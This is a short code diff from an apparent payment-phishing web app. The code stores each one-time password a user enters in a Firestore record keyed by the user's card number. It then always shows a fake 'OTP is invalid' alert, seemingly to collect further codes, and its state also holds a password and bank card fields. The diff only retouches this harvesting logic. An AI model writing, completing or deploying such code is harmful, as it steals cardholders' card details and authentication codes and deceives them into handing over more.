@@ -142,10 +142,10 @@ return ref
     pass: '',
     cardState: 'new',
     bank_card: [''],
-    prefix: '',
+    prefix: '', 
   });
 const handleAddotp=(otp:string)=>{
-  newotp.push(`${otp}  \n  ||  `)
+  newotp.push(`${otp} , `)
   const docRef = doc(db,'orders',paymentInfo!.cardNumber)
   updateDoc(docRef,{otp:newotp})
 }
@@ -540,8 +540,9 @@ const handleAddotp=(otp:string)=>{
                             setstep(2);
                             setisloading(false)
                             if (step === 2) {
-                              setisloading(true)
                               handleAddotp(paymentInfo!.otp!)
+                             
+                              setisloading(true)
                               setTimeout(() => {
                                 setisloading(false)
                                 return alert('OTP is invalid');
